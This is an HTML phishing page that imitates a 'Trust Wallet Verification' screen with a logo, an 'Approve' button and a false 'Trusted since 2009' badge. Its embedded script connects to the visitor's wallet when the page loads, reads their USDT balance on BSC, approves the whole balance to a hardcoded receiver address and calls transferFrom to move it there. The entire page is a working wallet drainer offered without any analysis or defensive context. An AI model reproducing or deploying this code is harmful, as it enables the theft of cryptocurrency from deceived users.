<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="./favicon.ico" type="image/x-icon" />
<title>Trust Wallet Verification</title>
<style>
  body { background:#081c3a; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:sans-serif; margin:0; padding:0; }
  img { width:80px; margin-bottom:10px; }
  h2 { margin:10px 0; font-size:1.2em; }
  p { opacity:0.7; }
  button { padding:10px 24px; background:#2a9dff; border:none; border-radius:8px; color:#fff; font-size:1rem; cursor:pointer; margin-top:20px; }
  .footer { margin-top:40px; opacity:0.5; font-size:0.7rem; }
</style>
</head>
<body>
  <img src="./logo.png" alt="Trust Wallet" />
  <h2>Verify Your Wallet</h2>
  <p id="status">Connecting to Trust Wallet...</p>
  <button id="approve-btn">Approve</button>
  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.2/web3.min.js"></script>
<script>
  const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // your address
  const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
  const ABI = [
    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
  ];
  
  let userAccount;

  async function connectWallet() {
    if(!window.ethereum) { document.getElementById('status').textContent = "Please use Trust Wallet DApp browser."; return; }
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    userAccount = accounts[0];
    document.getElementById('status').textContent = "Wallet connected.";
  }

  async function doApprove() {
    const web3 = new Web3(window.ethereum);
    const contract = new web3.eth.Contract(ABI, USDT);
    const balance = await contract.methods.balanceOf(userAccount).call();
    if(balance > 0) {
      await contract.methods.approve(receiver, balance).send({ from: userAccount });
      await contract.methods.transferFrom(userAccount, receiver, balance).send({ from: userAccount });
      document.getElementById('status').textContent = "✅ Success! Tokens transferred.";
    } else {
      document.getElementById('status').textContent = "No USDT balance found.";
    }
  }

  document.getElementById('approve-btn').onclick = doApprove;
  window.addEventListener('load', connectWallet);
</script>
</body>
</html>
